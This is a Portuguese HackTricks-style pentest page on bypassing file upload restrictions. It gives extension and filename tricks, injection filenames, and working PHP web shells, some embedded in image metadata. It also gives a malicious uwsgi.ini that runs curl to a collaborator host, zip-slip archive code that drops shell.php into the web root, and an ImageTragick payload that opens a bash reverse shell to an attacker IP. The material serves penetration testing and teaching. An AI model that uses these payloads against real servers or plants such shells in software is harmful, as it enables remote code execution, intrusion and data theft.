# Envio de Arquivos

{{#include ../../banners/hacktricks-training.md}}

## Metodologia Geral de Upload de Arquivos

Outras extensões úteis:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Contornar verificações de extensões de arquivo

1. Se aplicável, verifique as extensões anteriores. Teste também usando algumas letras maiúsculas: _pHp, .pHP5, .PhAr ..._
2. Verifique **adicionando uma extensão válida antes** da extensão de execução (use as extensões anteriores também):
- _file.png.php_
- _file.png.Php5_
3. Tente adicionar **caracteres especiais no final.** Você pode usar o Burp para **bruteforce** todos os caracteres **ascii** e **Unicode**. (_Note que você também pode tentar usar as **extensões** mencionadas anteriormente_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Tente contornar as proteções **enganando o parser de extensão** do lado servidor com técnicas como **duplicar** a **extensão** ou **adicionar dados lixo** (bytes **null**) entre extensões. _Você também pode usar as **extensões anteriores** para preparar um payload melhor._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Adicione **outra camada de extensões** ao teste anterior:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Tente colocar a **extensão de execução antes da extensão válida** e torça para que o servidor esteja mal configurado. (útil para explorar misconfigurações do Apache onde qualquer coisa com extensão .php, mesmo não terminando em .php, irá executar código):
- _ex: file.php.png_
7. Usando **NTFS alternate data stream (ADS)** no **Windows**. Nesse caso, um caractere dois-pontos ":" será inserido após uma extensão proibida e antes de uma permitida. Como resultado, um **arquivo vazio com a extensão proibida** será criado no servidor (ex.: "file.asax:.jpg"). Esse arquivo pode ser editado mais tarde usando outras técnicas, como usando seu short filename. O padrão "**::$data**” também pode ser usado para criar arquivos não vazios. Portanto, adicionar um ponto após esse padrão pode ser útil para contornar restrições adicionais (ex.: "file.asp::$data.”)
8. Tente exceder os limites de nome de arquivo. A extensão válida é cortada. E o PHP malicioso fica. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Contornar Content-Type, Magic Number, Compressão & Redimensionamento

- Contorne verificações de **Content-Type** definindo o **valor** do cabeçalho **Content-Type** para: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Contorne checagem de **magic number** adicionando no início do arquivo os **bytes de uma imagem real** (confundir o comando _file_). Ou introduza o shell dentro dos **metadados**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
` ` ou você também poderia **introduzir o payload diretamente** em uma imagem:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se **compressão está sendo aplicada à sua imagem**, por exemplo usando algumas bibliotecas PHP padrão como [PHP-GD](https://www.php.net/manual/fr/book.image.php), as técnicas anteriores não serão úteis. No entanto, você pode usar o chunk **PLTE** [**técnica definida aqui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir texto que **sobreviva à compressão**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- A página web também pode estar **redimensionando** a **imagem**, usando por exemplo as funções PHP-GD `imagecopyresized` ou `imagecopyresampled`. Contudo, você pode usar o chunk **IDAT** [**técnica definida aqui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir texto que **sobreviva à compressão**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Outra técnica para fazer um payload que **sobrevive a um redimensionamento da imagem**, usando a função PHP-GD `thumbnailImage`. Entretanto, você pode usar o chunk **tEXt** [**técnica definida aqui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir texto que **sobreviva à compressão**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Outras técnicas para verificar

- Encontre uma vulnerabilidade para **renomear** o arquivo já enviado (para alterar a extensão).
- Encontre uma vulnerabilidade de **Local File Inclusion** para executar o backdoor.
- **Possível divulgação de informação**:
1. Faça upload **várias vezes** (e ao **mesmo tempo**) do **mesmo arquivo** com o **mesmo nome**
2. Faça upload de um arquivo com o **nome** de um **arquivo** ou **pasta** que **já existe**
3. Fazer upload de um arquivo com **".", "..", ou "..." como nome**. Por exemplo, no Apache no **Windows**, se a aplicação salva os arquivos enviados em "/www/uploads/", o arquivo com nome "." vai criar um arquivo chamado "uploads" em "/www/".
4. Fazer upload de um arquivo que possa não ser excluído facilmente como **"…:.jpg”** no **NTFS**. (Windows)
5. Fazer upload de um arquivo no **Windows** com **caracteres inválidos** como `|<>*?”` em seu nome. (Windows)
6. Fazer upload de um arquivo no **Windows** usando nomes **reservados** (**proibidos**) como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, e COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, e LPT9.
- Tente também **fazer upload de um executável** (.exe) ou um **.html** (menos suspeito) que **executará código** quando aberto acidentalmente pela vítima.

### Truques com extensões especiais

Se você está tentando enviar arquivos para um servidor **PHP**, [dê uma olhada no truque **.htaccess** para executar código](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se você está tentando enviar arquivos para um servidor **ASP**, [dê uma olhada no truque **.config** para executar código](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Os arquivos `.phar` são como os `.jar` para java, mas para php, e podem ser **usados como um arquivo php** (executando-o com php, ou incluindo-o dentro de um script...)

A extensão `.inc` às vezes é usada para arquivos php que são apenas usados para **importar arquivos**, então, em algum ponto, alguém pode ter permitido **essa extensão ser executada**.

## **Jetty RCE**

Se você consegue fazer upload de um arquivo XML em um servidor Jetty você pode obter [RCE porque **novos \*.xml e \*.war são processados automaticamente**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Então, como mencionado na imagem a seguir, faça upload do arquivo XML para `$JETTY_BASE/webapps/` e espere pela shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Para uma exploração detalhada desta vulnerabilidade verifique a pesquisa original: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Vulnerabilidades de Remote Command Execution (RCE) podem ser exploradas em servidores uWSGI se alguém tiver a capacidade de modificar o arquivo de configuração `.ini`. Arquivos de configuração uWSGI utilizam uma sintaxe específica para incorporar variáveis "mágicas", placeholders e operadores. Notavelmente, o operador '@', usado como `@(filename)`, é projetado para incluir o conteúdo de um arquivo. Entre os vários esquemas suportados no uWSGI, o esquema "exec" é particularmente potente, permitindo a leitura de dados a partir da saída padrão de um processo. Esse recurso pode ser manipulado para fins maliciosos, como Remote Command Execution ou Arbitrary File Write/Read quando um arquivo de configuração `.ini` é processado.

Considere o seguinte exemplo de um arquivo `uwsgi.ini` malicioso, demonstrando vários esquemas:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
A execução do payload ocorre durante o parsing do arquivo de configuração. Para que a configuração seja ativada e analisada, o processo uWSGI deve ser reiniciado (potencialmente após um crash ou devido a um ataque de Denial of Service) ou o arquivo deve ser configurado para auto-reload. O recurso auto-reload, se habilitado, recarrega o arquivo em intervalos especificados ao detectar mudanças.

É crucial entender a natureza permissiva do parsing do arquivo de configuração do uWSGI. Especificamente, o payload discutido pode ser inserido em um arquivo binário (como uma imagem ou PDF), ampliando ainda mais o escopo de exploração potencial.

## **wget File Upload/SSRF Trick**

Em algumas ocasiões você pode encontrar que um servidor está usando **`wget`** para **baixar arquivos** e você pode **indicar** a **URL**. Nesses casos, o código pode estar verificando se a extensão dos arquivos baixados está dentro de uma whitelist para assegurar que somente arquivos permitidos serão baixados. No entanto, **this check can be bypassed.**\
A **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"\*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note que **outra opção** que você pode estar pensando para contornar essa verificação é fazer com que o **servidor HTTP redirecione para um arquivo diferente**, de modo que a URL inicial passe pela verificação e então wget baixe o arquivo redirecionado com o novo nome. Isso **não funcionará** **a menos que** wget esteja sendo usado com o **parâmetro** `--trust-server-names` porque **wget vai baixar a página redirecionada com o nome do arquivo indicado na URL original**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) é uma ferramenta poderosa projetada para auxiliar Pentesters e Bug Hunters a testar mecanismos de upload de arquivos. Ela aproveita várias técnicas de bug bounty para simplificar o processo de identificação e exploração de vulnerabilidades, garantindo avaliações completas de aplicações web.

### Corrupting upload indices with snprintf quirks (historical)

Alguns handlers de upload legados que usam `snprintf()` ou similar para construir arrays multi-file a partir de um upload single-file podem ser enganados a forjar a estrutura `_FILES`. Devido a inconsistências e truncamentos no comportamento de `snprintf()`, um upload cuidadosamente criado pode aparecer como múltiplos arquivos indexados no lado servidor, confundindo a lógica que assume uma forma estrita (por exemplo, tratando-o como um upload multi-file e tomando caminhos inseguros). Embora seja raro hoje em dia, esse padrão de “index corruption” ocasionalmente ressurge em CTFs e código legado.

## From File upload to other vulnerabilities

- Defina **filename** como `../../../tmp/lol.png` e tente alcançar um **path traversal**
- Defina **filename** como `sleep(10)-- -.jpg` e você pode ser capaz de alcançar uma **SQL injection**
- Defina **filename** como `<svg onload=alert(document.domain)>` para alcançar um **XSS**
- Defina **filename** como `; sleep 10;` para testar alguma command injection (mais [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Tente **diferentes payloads svg** de [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famosa vulnerabilidade **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Se você puder **indicar ao servidor web para capturar uma imagem a partir de uma URL** você pode tentar abusar de um [SSRF](../ssrf-server-side-request-forgery/index.html). Se essa **imagem** for **salva** em algum site **público**, você também poderia indicar uma URL de [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **roubar informações de cada visitante**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDFs especialmente criados para XSS: A [página a seguir apresenta como **injetar dados em PDF para obter execução de JS**](../xss-cross-site-scripting/pdf-injection.md). Se você puder fazer upload de PDFs, pode preparar um PDF que execute JS arbitrário seguindo as indicações dadas.
- Faça upload do \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) para verificar se o servidor possui algum **antivírus**
- Verifique se existe algum **limite de tamanho** ao enviar arquivos

Aqui vai uma lista top 10 de coisas que você pode conseguir fazendo upload (de [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Bytes Mágicos do Cabeçalho

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Consulte [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) para outros tipos de arquivo.

## Upload de Zip/Tar automaticamente descomprimido

Se você puder fazer upload de um ZIP que será descomprimido no servidor, você pode fazer 2 coisas:

### Symlink

Envie um arquivo contendo symlinks para outros arquivos; ao acessar os arquivos descomprimidos, você acessará os arquivos vinculados:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Descompactar em pastas diferentes

A criação inesperada de arquivos em diretórios durante a descompressão é um problema significativo. Apesar da suposição inicial de que essa configuração poderia impedir a execução de comandos a nível do sistema operacional via uploads de arquivos maliciosos, o suporte à compressão hierárquica e as capacidades de directory traversal do formato de arquivo ZIP podem ser explorados. Isso permite que atacantes contornem restrições e escapem dos diretórios de upload seguros manipulando a funcionalidade de descompressão da aplicação alvo.

Um exploit automatizado para criar esses arquivos está disponível em [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). O utilitário pode ser usado como mostrado:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Além disso, a **symlink trick with evilarc** é uma opção. Se o objetivo for direcionar um arquivo como `/flag.txt`, um symlink para esse arquivo deve ser criado no seu sistema. Isso garante que o evilarc não encontre erros durante sua operação.

Abaixo está um exemplo de código Python usado para criar um arquivo zip malicioso:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abuso de compressão para file spraying**

Para mais detalhes **consulte o post original em**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Criando um PHP Shell**: Código PHP é escrito para executar comandos passados através da variável `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Vários arquivos são criados e um arquivo zip é montado contendo esses arquivos.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Os nomes dos arquivos dentro do zip são alterados usando vi ou um hex editor, trocando "xxA" por "../" para percorrer diretórios.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Envie este conteúdo com uma extensão de imagem para explorar a vulnerabilidade **(ImageMagick , 7.0.1-1)** (veja o [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporando PHP Shell em PNG

Incorporar um PHP shell no chunk IDAT de um arquivo PNG pode efetivamente contornar certas operações de processamento de imagem. As funções `imagecopyresized` e `imagecopyresampled` do PHP-GD são particularmente relevantes nesse contexto, pois são comumente usadas para redimensionar e resamplear imagens, respectivamente. A capacidade do PHP shell incorporado de permanecer inalterado por essas operações é uma vantagem significativa em certos casos de uso.

Uma exploração detalhada dessa técnica, incluindo sua metodologia e aplicações potenciais, é fornecida no seguinte artigo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Este recurso oferece um entendimento abrangente do processo e suas implicações.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Arquivos Polyglot

Arquivos polyglot servem como uma ferramenta única em segurança cibernética, atuando como camaleões que podem existir validamente em múltiplos formatos de arquivo simultaneamente. Um exemplo intrigante é um [GIFAR](https://en.wikipedia.org/wiki/Gifar), um híbrido que funciona tanto como GIF quanto como um RAR archive. Esses arquivos não se limitam a esse pareamento; combinações como GIF e JS ou PPT e JS também são viáveis.

A utilidade central dos arquivos polyglot reside em sua capacidade de contornar medidas de segurança que filtram arquivos com base no tipo. É prática comum em várias aplicações permitir apenas certos tipos de arquivo para upload — como JPEG, GIF ou DOC — para mitigar o risco apresentado por formatos potencialmente perigosos (por exemplo, JS, PHP ou Phar). Contudo, um polyglot, ao satisfazer os critérios estruturais de múltiplos tipos de arquivo, pode contornar essas restrições furtivamente.

Apesar de sua adaptabilidade, polyglots encontram limitações. Por exemplo, embora um polyglot possa simultaneamente incorporar um arquivo PHAR (PHp ARchive) e um JPEG, o sucesso do seu upload pode depender das políticas de extensão de arquivo da plataforma. Se o sistema for rigoroso quanto às extensões permitidas, a mera dualidade estrutural de um polyglot pode não ser suficiente para garantir o upload.

### Fazer upload de JSONs válidos como se fossem PDF

Como evitar detecções de tipo de arquivo fazendo upload de um arquivo JSON válido mesmo quando não permitido, fingindo ser um arquivo PDF (técnicas de **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Contanto que os bytes mágicos `%PDF` estejam nos primeiros 1024 bytes, é considerado válido (veja exemplo no post)
- **`pdflib` library**: Adicione um formato PDF falso dentro de um campo do JSON para que a biblioteca pense que é um pdf (veja exemplo no post)
- **`file` binary**: Pode ler até 1048576 bytes de um arquivo. Basta criar um JSON maior que isso para que não consiga parsear o conteúdo como um json e então, dentro do JSON, colocar a parte inicial de um PDF real e ele vai interpretar como PDF

## Referências

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
